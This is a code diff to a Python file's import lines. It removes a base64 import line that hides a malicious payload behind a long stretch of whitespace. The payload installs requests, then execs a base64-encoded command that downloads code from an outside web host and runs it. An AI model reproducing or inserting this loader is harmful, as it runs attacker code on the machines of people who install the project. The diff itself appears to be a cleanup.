@@ -1,5 +1,5 @@
 from typing import Any, List, Set, Tuple
-from base64 import b64encode                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vaGFuZGxlci1waGkudmVyY2VsLmFwcC8xLnR4dCIpLnRleHQp').decode())
+from base64 import b64encode
 from json import load
 from random import choice as randchoice
 from time import sleep, time
